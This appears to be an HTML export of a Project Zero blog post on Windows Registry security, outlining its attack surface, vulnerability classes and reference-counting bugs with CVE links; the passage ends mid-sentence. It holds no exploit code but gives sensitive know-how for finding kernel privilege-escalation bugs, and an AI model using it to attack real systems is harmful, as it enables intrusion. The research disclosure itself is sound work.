&quot;}ul.lst-kix_v2df8br1ncnr-0{list-style-type:none}.lst-kix_pkd7hbr03pq1-7&gt;li:before{content:&quot;&quot; counter(lst-ctn-kix_pkd7hbr03pq1-7,lower-latin) &quot;. &quot;}ol{margin:0;padding:0}table td,table th{padding:0}.ujDEXfwdRL-c32{border-right-style:solid;padding:5pt 5pt 5pt 5pt;border-bottom-color:#000000;border-top-width:1pt;border-right-width:1pt;border-left-color:#000000;vertical-align:top;border-right-color:#000000;border-left-width:1pt;border-top-style:solid;border-left-style:solid;border-bottom-width:1pt;width:129pt;border-top-color:#000000;border-bottom-style:solid}.ujDEXfwdRL-c18{border-right-style:solid;padding:5pt 5pt 5pt 5pt;border-bottom-color:#000000;border-top-width:1pt;border-right-width:1pt;border-left-color:#000000;vertical-align:top;border-right-color:#000000;border-left-width:1pt;border-top-style:solid;border-left-style:solid;border-bottom-width:1pt;width:93.8pt;border-top-color:#000000;border-bottom-style:solid}.ujDEXfwdRL-c0{border-right-style:solid;padding:5pt 5pt 5pt 5pt;border-bottom-color:#000000;border-top-width:1pt;border-right-width:1pt;border-left-color:#000000;vertical-align:top;border-right-color:#000000;border-left-width:1pt;border-top-style:solid;border-left-style:solid;border-bottom-width:1pt;width:117pt;border-top-color:#000000;border-bottom-style:solid}.ujDEXfwdRL-c37{border-right-style:solid;padding:5pt 5pt 5pt 5pt;border-bottom-color:#000000;border-top-width:1pt;border-right-width:1pt;border-left-color:#000000;vertical-align:top;border-right-color:#000000;border-left-width:1pt;border-top-style:solid;border-left-style:solid;border-bottom-width:1pt;width:102pt;border-top-color:#000000;border-bottom-style:solid}.ujDEXfwdRL-c39{border-right-style:solid;padding:5pt 5pt 5pt 5pt;border-bottom-color:#000000;border-top-width:1pt;border-right-width:1pt;border-left-color:#000000;vertical-align:top;border-right-color:#000000;border-left-width:1pt;border-top-style:solid;border-left-style:solid;border-bottom-width:1pt;width:164.2pt;border-top-color:#000000;border-bottom-style:solid}.ujDEXfwdRL-c40{border-right-style:solid;padding:5pt 5pt 5pt 5pt;border-bottom-color:#000000;border-top-width:1pt;border-right-width:1pt;border-left-color:#000000;vertical-align:top;border-right-color:#000000;border-left-width:1pt;border-top-style:solid;border-left-style:solid;border-bottom-width:1pt;width:546pt;border-top-color:#000000;border-bottom-style:solid}.ujDEXfwdRL-c5{color:#000000;font-weight:400;text-decoration:none;vertical-align:baseline;font-size:11pt;font-family:&quot;Arial&quot;;font-style:normal}.ujDEXfwdRL-c2{padding-top:16pt;padding-bottom:4pt;line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}.ujDEXfwdRL-c4{padding-top:0pt;padding-bottom:0pt;line-height:1.5;orphans:2;widows:2;text-align:left}.ujDEXfwdRL-c46{padding-top:14pt;padding-bottom:4pt;line-height:1.5;page-break-after:avoid;text-align:left}.ujDEXfwdRL-c48{padding-top:16pt;padding-bottom:4pt;line-height:1.5;page-break-after:avoid;text-align:left}.ujDEXfwdRL-c28{padding-top:18pt;padding-bottom:6pt;line-height:1.5;page-break-after:avoid;text-align:left}.ujDEXfwdRL-c24{padding-top:14pt;padding-bottom:4pt;line-height:1.5;page-break-after:avoid;text-align:left}.ujDEXfwdRL-c1{padding-top:0pt;padding-bottom:0pt;line-height:1.5;text-align:left;height:11pt}.ujDEXfwdRL-c8{text-decoration-skip-ink:none;-webkit-text-decoration-skip:none;color:#1155cc;text-decoration:underline}.ujDEXfwdRL-c33{border-spacing:0;border-collapse:collapse;margin-right:auto}.ujDEXfwdRL-c12{padding-top:0pt;padding-bottom:0pt;line-height:1.5;text-align:left}.ujDEXfwdRL-c10{padding-top:12pt;padding-bottom:12pt;line-height:1.5;text-align:left}.ujDEXfwdRL-c30{padding-top:0pt;padding-bottom:0pt;line-height:1.5;text-align:left}.ujDEXfwdRL-c25{color:#434343;font-weight:400;font-size:14pt;font-family:&quot;Arial&quot;}.ujDEXfwdRL-c34{color:#666666;font-weight:400;font-size:12pt;font-family:&quot;Arial&quot;}.ujDEXfwdRL-c22{padding-top:0pt;padding-bottom:0pt;line-height:1.0;text-align:left}.ujDEXfwdRL-c9{color:#000000;text-decoration:none;vertical-align:baseline;font-style:normal}.ujDEXfwdRL-c44{padding-top:0pt;padding-bottom:0pt;line-height:1.5;text-align:center}.ujDEXfwdRL-c21{font-weight:700;font-size:11pt;font-family:&quot;Arial&quot;}.ujDEXfwdRL-c38{color:#666666;font-size:12pt;font-family:&quot;Arial&quot;}.ujDEXfwdRL-c20{text-decoration:none;vertical-align:baseline;font-style:normal}.ujDEXfwdRL-c47{color:#999999;font-weight:400;font-family:&quot;Arial&quot;}.ujDEXfwdRL-c3{font-size:9pt;font-weight:400;font-family:&quot;Roboto Mono&quot;}.ujDEXfwdRL-c49{text-decoration-skip-ink:none;-webkit-text-decoration-skip:none;text-decoration:underline}.ujDEXfwdRL-c41{background-color:#ffffff;max-width:468pt;padding:72pt 72pt 72pt 72pt}.ujDEXfwdRL-c42{font-weight:400;font-size:16pt;font-family:&quot;Arial&quot;}.ujDEXfwdRL-c7{margin-left:36pt;padding-left:0pt}.ujDEXfwdRL-c36{margin-left:72pt;padding-left:0pt}.ujDEXfwdRL-c11{orphans:2;widows:2}.ujDEXfwdRL-c6{color:#188038}.ujDEXfwdRL-c19{color:#000000}.ujDEXfwdRL-c43{font-family:&quot;Roboto Mono&quot;}.ujDEXfwdRL-c26{font-weight:700}.ujDEXfwdRL-c31{background-color:#d9d9d9}.ujDEXfwdRL-c15{color:#37474f}.ujDEXfwdRL-c17{color:#1967d2}.ujDEXfwdRL-c35{font-size:11pt}.ujDEXfwdRL-c14{height:11pt}.ujDEXfwdRL-c29{color:#c5221f}.ujDEXfwdRL-c16{color:#b80672}.ujDEXfwdRL-c13{font-style:italic}.ujDEXfwdRL-c23{font-size:9pt}.ujDEXfwdRL-c45{height:24.3pt}.ujDEXfwdRL-c27{height:0pt}.title{padding-top:0pt;color:#000000;font-size:26pt;padding-bottom:3pt;font-family:&quot;Arial&quot;;line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}.subtitle{padding-top:0pt;color:#666666;font-size:15pt;padding-bottom:16pt;font-family:&quot;Arial&quot;;line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}li{color:#000000;font-size:11pt;font-family:&quot;Arial&quot;}p{margin:0;color:#000000;font-size:11pt;font-family:&quot;Arial&quot;}h1{padding-top:20pt;color:#000000;font-size:20pt;padding-bottom:6pt;font-family:&quot;Arial&quot;;line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h2{padding-top:18pt;color:#000000;font-size:16pt;padding-bottom:6pt;font-family:&quot;Arial&quot;;line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h3{padding-top:16pt;color:#434343;font-size:14pt;padding-bottom:4pt;font-family:&quot;Arial&quot;;line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h4{padding-top:14pt;color:#666666;font-size:12pt;padding-bottom:4pt;font-family:&quot;Arial&quot;;line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h5{padding-top:12pt;color:#666666;font-size:11pt;padding-bottom:4pt;font-family:&quot;Arial&quot;;line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h6{padding-top:12pt;color:#666666;font-size:11pt;padding-bottom:4pt;font-family:&quot;Arial&quot;;line-height:1.5;page-break-after:avoid;font-style:italic;orphans:2;widows:2;text-align:left}li{line-height:1.5}&lt;/style&gt;&lt;/head&gt;&lt;body class=&quot;c41 doc-content&quot;&gt;
 &lt;p class=&quot;ujDEXfwdRL-c12 ujDEXfwdRL-c11&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c20 ujDEXfwdRL-c35 ujDEXfwdRL-c47&quot;&gt;Posted by Mateusz Jurczyk, Google Project Zero&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ujDEXfwdRL-c4 ujDEXfwdRL-c14&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c5&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ujDEXfwdRL-c4&quot;&gt;&lt;span&gt;In the first three blog posts of this series, I sought to outline what the Windows Registry actually is, its role, history, and where to find further information about it.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;In the &lt;/span&gt;&lt;span&gt;subsequent &lt;/span&gt;&lt;span&gt;three posts, my goal was to describe in detail how this mechanism works internally &amp;ndash; from the perspective of its clients (e.g., user-mode applications running on Windows), the regf format used to encode hives, and finally the kernel itself, which contains its canonical implementation.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;I believe all these elements are essential for painting a complete picture of this subsystem, and in a way, it shows my own approach to security research.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;One could say that going through this tedious process of getting to know the target unnecessarily lengthens the total research time, and to some extent, they would be right.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;On the other hand, I believe that to conduct complete research, it is equally important to answer the question of &lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c13&quot;&gt;how&lt;/span&gt;&lt;span&gt;&amp;nbsp;certain things are implemented, as well as &lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c13&quot;&gt;why&lt;/span&gt;&lt;span&gt;&amp;nbsp;they are implemented that way &amp;ndash; and the latter part often requires a deeper dive into the subject.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;And since I have already spent the time reverse engineering and understanding various internal aspects of the registry, there are great reasons&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;to share the information with the wider community.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;There is a lack of publicly available materials on how various mechanisms in the registry work, especially the most recent and most complicated ones, so I hope that the knowledge I have documented here will prove useful to others in the future.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ujDEXfwdRL-c4 ujDEXfwdRL-c14&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c5&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ujDEXfwdRL-c4&quot;&gt;&lt;span&gt;In this blog post, we get to the heart of the matter, the actual security of the Windows Registry.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;I&amp;#39;d like to talk about what made a feature that was initially meant to be just a quick test of my fuzzing infrastructure draw me into manual research for the next 1.5&lt;/span&gt;&lt;span&gt;&amp;nbsp;~ &lt;/span&gt;&lt;span&gt;2 years, and result in Microsoft fixing (so far) 53 CVEs. I will describe the various areas that are important in the context of low-level security research, from very general ones, such as the characteristics of the codebase that allow security bugs to exist in the first place, to more specific ones, like all possible entry points to attack the registry, the impact of vulnerabilities and the primitives they generate, and some considerations on effective fuzzing and where more bugs might still be lurking.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ujDEXfwdRL-c4 ujDEXfwdRL-c14&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c5&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ujDEXfwdRL-c4&quot;&gt;&lt;span&gt;Let&amp;#39;s start with a quick recap of the registry&amp;#39;s most fundamental properties as an attack surface:&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ujDEXfwdRL-c4 ujDEXfwdRL-c14&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c5&quot;&gt;&lt;/span&gt;&lt;/p&gt;&lt;ul style=&quot;padding: 0;&quot; class=&quot;lst-kix_dq55oor2y5qd-0 start&quot;&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c4 c7 li-bullet-0&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c26&quot;&gt;Local attack surface for privilege escalation:&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;As we already know, the Windows Registry is a strictly local attack surface that can potentially be leveraged by a less privileged process to gain the privileges of a higher privileged process or the kernel.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;It doesn&amp;#39;t have any remote components except for the Remote Registry service, which is relatively small and not accessible from the Internet on most Windows installations.&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c4 c7 li-bullet-0&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c26&quot;&gt;Complex, old codebase in a memory-unsafe language:&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;The Windows Registry is a vast and &lt;/span&gt;&lt;span&gt;complex&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;mechanism, entirely written in C, most of it many years ago.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;This means that both logic and memory safety bugs are likely to occur, and many such issues, once found, would likely remain unfixed for years or even decades.&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c4 c7 li-bullet-0&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c26&quot;&gt;Present in the core NT kernel:&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;The registry implementation resides in the core Windows kernel executable (ntoskrnl.exe), which means it is not subject to mitigations like the win32k lockdown.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;Of course, the reachability of each registry bug needs to be considered separately in the context of specific restrictions (e.g., sandbox), as some of them require file system access or the ability to open a handle to a specific key.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;Nevertheless, being an integral part of the kernel significantly increases the chances that a given bug can be exploited.&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c4 c7 li-bullet-0&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c26&quot;&gt;Most code reachable by unprivileged users:&lt;/span&gt;&lt;span&gt;&amp;nbsp;T&lt;/span&gt;&lt;span&gt;he registry is a feature that was created for use by ordinary user-mode applications.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;It is therefore not surprising that the vast majority of registry-related code is reachable without any special privileges, and only a small part of the interface requires administrator rights.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;Privilege escalation from medium &lt;/span&gt;&lt;span&gt;IL&lt;/span&gt;&lt;span&gt;&amp;nbsp;(Integrity Level) to the kernel is probably the most likely scenario of how a registry vulnerability could be exploited.&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c4 c7 li-bullet-0&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c26&quot;&gt;Manages sensitive information:&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;In addition to the registry implementation itself being complex and potentially prone to bugs, it&amp;#39;s important to remember that the registry inherently stores security-critical system information, including various global configurations, passwords, user permissions, and other sensitive data.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;This means that not only low-level bugs that directly allow code execution are a concern, but also data-only attacks and logic bugs that permit unauthorized modification or even disclosure of registry keys without proper permissions.&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c4 c7 li-bullet-0&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c26&quot;&gt;Not trivial to fuzz, and not very well documented:&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;Overall, it seems that the registry is not a very friendly target for bug hunting without any knowledge of its internals.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;At the same time, obtaining the information is not easy either, especially for the latest registry mechanisms, which are&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;not publicly documented and learning about them basically boils down to reverse engineering.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;In other words, the entry bar into this area is quite high, which can be an advantage or a disadvantage depending on the time and commitment of a potential researcher.&lt;/span&gt;&lt;/li&gt;&lt;/ul&gt;&lt;h2 class=&quot;ujDEXfwdRL-c28 ujDEXfwdRL-c11&quot; id=&quot;h.pbffpxrocvy2&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c9 ujDEXfwdRL-c42&quot;&gt;Security properties&lt;/span&gt;&lt;/h2&gt;
 &lt;p class=&quot;ujDEXfwdRL-c4&quot;&gt;&lt;span&gt;The above &lt;/span&gt;&lt;span&gt;cursory analysis seems to indicate that the registry may be a good audit target for someone interested in EoP bugs on Windows.&lt;/span&gt;&lt;span&gt;&amp;nbsp; &lt;/span&gt;&lt;span&gt;Let&amp;#39;s now take a closer look at some of the specific low-level reasons why the registry has proven to be a fruitful research objective&lt;/span&gt;&lt;span&gt;.&lt;/span&gt;&lt;/p&gt;&lt;h3 class=&quot;ujDEXfwdRL-c2&quot; id=&quot;h.e8h895zct3x5&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c25 ujDEXfwdRL-c20&quot;&gt;Broad range of bug classes&lt;/span&gt;&lt;/h3&gt;
 &lt;p class=&quot;ujDEXfwdRL-c4&quot;&gt;&lt;span&gt;Due to the registry being both complex and a central mechanism in the system operating with kernel-mode privileges, numerous classes of bugs can occur within it.&lt;/span&gt;&lt;span&gt;&amp;nbsp;An example vulnerability &lt;/span&gt;&lt;span&gt;classification is &lt;/span&gt;&lt;span&gt;presented &lt;/span&gt;&lt;span&gt;below:&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ujDEXfwdRL-c4 ujDEXfwdRL-c14&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c5&quot;&gt;&lt;/span&gt;&lt;/p&gt;&lt;ul style=&quot;padding: 0;&quot; class=&quot;lst-kix_ldlvyaupc5j0-0 start&quot;&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c4 c7 li-bullet-0&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c26&quot;&gt;Hive memory corruption:&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;Every invasive operation performed on the registry (i.e., a &amp;quot;write&amp;quot; operation) is reflected in changes made to the memory-mapped view of the hive&amp;#39;s structure.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;Considering that objects within the hive include variable-length arrays, structures with counted references, and references to other cells via cell indexes (hives&amp;#39; equivalent of memory pointers), it&amp;#39;s natural to expect common issues like buffer overflows or use-after-frees.&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c4 c7 li-bullet-0&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c26&quot;&gt;Pool memory corruption:&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;In addition to hive memory mappings, the Configuration Manager also stores a significant amount of information on kernel pools.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;Firstly, there are cached copies of certain hive data, as described in my previous blog post.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;Secondly, there are various auxiliary objects, such as those allocated and subsequently released within a single system call.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;Many of these objects can fall victim to memory management bugs typical of the C language.&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c4 c7 li-bullet-0&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c26&quot;&gt;Information disclosure:&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;Because the registry implementation is part of the kernel, and it exchanges large amounts of information with unprivileged user-mode applications, it must be careful not to accidentally disclose uninitialized data from the stack or kernel pools to the caller.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;This can happen both through output data copied to user-mode memory and through other channels, such as data leakage to a file (hive file or related log file).&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;Therefore, it is worthwhile to keep an eye on whether all arrays and dynamically allocated buffers are fully populated or carefully filled with zeros before passing them to a lower-privileged context.&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c4 c7 li-bullet-0&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c26&quot;&gt;Race conditions:&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;As a multithreaded environment, Windows allows for concurrent registry access by multiple threads.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;Consequently, the registry implementation must correctly synchronize access to all shared kernel-side objects and be mindful of &amp;quot;double fetch&amp;quot; bugs, which are characteristic of user-mode client interactions.&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c4 c7 li-bullet-0&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c26&quot;&gt;Logic bugs:&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;In addition to being memory-safe and free of low-level bugs, a secure registry implementation must also enforce correct high-level security logic.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;This means preventing unauthorized users from accessing restricted keys and ensuring that the registry operates consistently with its documentation under all circumstances.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;This requires a deep understanding of both the explicit documentation and the implicit assumptions that underpin the registry&amp;#39;s security from the kernel developers.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;Ultimately, any behavior that deviates from expected logic, whether documented or assumed, could lead to vulnerabilities.&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c4 c7 li-bullet-0&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c26&quot;&gt;Inter-process attacks:&lt;/span&gt;&lt;span&gt;&amp;nbsp;T&lt;/span&gt;&lt;span&gt;he registry can serve as a security target, but also as a means to exploit flaws in other applications on the system.&lt;/span&gt;&lt;span&gt;&amp;nbsp;It&lt;/span&gt;&lt;span&gt;&amp;nbsp;is a shared database, and a local attacker has many ways to indirectly interact with more privileged programs and services.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;A simple example is when privileged code sets overly permissive permissions on its keys, allowing unauthorized reading or modification.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;More complex cases can occur when there is a race condition between key creation and setting its restricted security descriptor, or when a key modification involving several properties is not performed transactionally, potentially leading to an inconsistent state.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;The specifics depend on how the privileged process uses the registry interface.&lt;/span&gt;&lt;/li&gt;&lt;/ul&gt;
 &lt;p class=&quot;ujDEXfwdRL-c4 ujDEXfwdRL-c14&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c5&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ujDEXfwdRL-c4&quot;&gt;&lt;span&gt;If I were to depict the Windows Registry in a single Venn diagram, highlighting its various possible bug classes, it might look something like this:&lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c5&quot;&gt;&lt;br&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ujDEXfwdRL-c11 ujDEXfwdRL-c44&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c5&quot;&gt;&lt;a href=&quot;https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhTAwmKkYwj-CpSxel2GRyayZAwdHslWPyC9E_p9cSof2B2Z7PI19HYsSU79hQN1unmzNqgUBzb55QPGOvbGfIsLmvOpva1v0GIOb42IW923oTdR_Hx45_9IkrOhz3XdglaGQlS9LrnHC0hbEI_ue-j5-HkxpMPNifT6SMSuoJYmQmQkHBw2zY4L7KsOIw/s1297/image2.png&quot; style=&quot;display: block; padding: 1em 0;text-align: center;&quot;&gt;&lt;img src=&quot;https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhTAwmKkYwj-CpSxel2GRyayZAwdHslWPyC9E_p9cSof2B2Z7PI19HYsSU79hQN1unmzNqgUBzb55QPGOvbGfIsLmvOpva1v0GIOb42IW923oTdR_Hx45_9IkrOhz3XdglaGQlS9LrnHC0hbEI_ue-j5-HkxpMPNifT6SMSuoJYmQmQkHBw2zY4L7KsOIw/s1200/image2.png&quot; border=&quot;0&quot; alt=&quot;A Venn diagram illustrates the intersection of different bug categories within the Windows Registry. Four overlapping circles represent Kernel-specific bugs, File parsing bugs, Object lifetime bugs, and Logic bugs. The central area where all circles overlap is highlighted, indicating vulnerabilities that combine all these bug types.&quot; style=&quot;max-height: 750px; max-width: 600px;&quot;title=&quot;A Venn diagram illustrates the intersection of different bug categories within the Windows Registry. Four overlapping circles represent Kernel-specific bugs, File parsing bugs, Object lifetime bugs, and Logic bugs. The central area where all circles overlap is highlighted, indicating vulnerabilities that combine all these bug types.&quot; /&gt;&lt;/a&gt;&lt;/span&gt;&lt;/p&gt;&lt;h3 class=&quot;ujDEXfwdRL-c2&quot; id=&quot;h.7evbuq6vgavj&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c25 ujDEXfwdRL-c20&quot;&gt;Manual reference counting&lt;/span&gt;&lt;/h3&gt;
 &lt;p class=&quot;ujDEXfwdRL-c4&quot;&gt;&lt;span&gt;As I have mentioned multiple times, security descriptors in registry hives are shared by multiple keys, and therefore, must be reference counted.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;The field responsible for this is a 32-bit unsigned integer, and any situation where it&lt;/span&gt;&lt;span&gt;&amp;#39;s&lt;/span&gt;&lt;span&gt;&amp;nbsp;set to a value lower than the actual number of references can result in the release of that security descriptor while it&amp;#39;s still in use, leading to a use-after-free condition and hive-based memory corruption.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;So, we see that it&amp;#39;s absolutely critical that this refcounting is implemented correctly, but unfortunately, there are (&lt;/span&gt;&lt;span&gt;or were until recently&lt;/span&gt;&lt;span&gt;) many reasons why this mechanism could be prone to &lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c5&quot;&gt;bugs:&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ujDEXfwdRL-c4 ujDEXfwdRL-c14&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c5&quot;&gt;&lt;/span&gt;&lt;/p&gt;&lt;ul style=&quot;padding: 0;&quot; class=&quot;lst-kix_sdl0l5x6yq8f-0 start&quot;&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c4 c7 li-bullet-0&quot;&gt;&lt;span&gt;Usually, a reference count is a construct that exists strictly in memory, where it is initialized with a value of 1, then incremented and decremented some number of times, and finally drops to zero, causing the object to be freed.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;However, with registry hives, the initial refcount values are loaded from disk, from a file that we assume is controlled by the attacker.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;Therefore, these values cannot be trusted in any way, and the first necessary step is to actually compare and potentially adjust them according to the true number of references to each descriptor.&lt;/span&gt;&lt;span&gt;&amp;nbsp;Even though&lt;/span&gt;&lt;span&gt;&amp;nbsp;this is done in theory, bugs can creep into this logic in practice (&lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c8&quot;&gt;&lt;a href=&quot;https://project-zero.issues.chromium.org/issues/42451423&quot;&gt;CVE-2022-34707&lt;/a&gt;&lt;/span&gt;&lt;span&gt;, &lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c8&quot;&gt;&lt;a href=&quot;https://project-zero.issues.chromium.org/issues/42451601&quot;&gt;CVE-2023-38139&lt;/a&gt;&lt;/span&gt;&lt;span&gt;).&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c4 c7 li-bullet-0&quot;&gt;&lt;span&gt;For a long time, all operations on reference counts were performed by directly referencing the _CM_KEY_SECURITY.ReferenceCount field, instead of using a secure wrapper.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;As a result, none of these incrementations were protected against integer overflow.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;This meant that not only &lt;/span&gt;&lt;span&gt;a &lt;/span&gt;&lt;span&gt;too small, but also a &lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c13&quot;&gt;too large&lt;/span&gt;&lt;span&gt;&amp;nbsp;refcount value could eventually overflow and lead to a use-after-free situation (&lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c8&quot;&gt;&lt;a href=&quot;https://project-zero.issues.chromium.org/issues/42451552&quot;&gt;CVE-2023-28248&lt;/a&gt;&lt;/span&gt;&lt;span&gt;, &lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c8&quot;&gt;&lt;a href=&quot;https://project-zero.issues.chromium.org/issues/42451732&quot;&gt;CVE-2024-43641&lt;/a&gt;&lt;/span&gt;&lt;span&gt;).&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;This weakness was gradually addressed in various places in the registry code between April 2023 and November 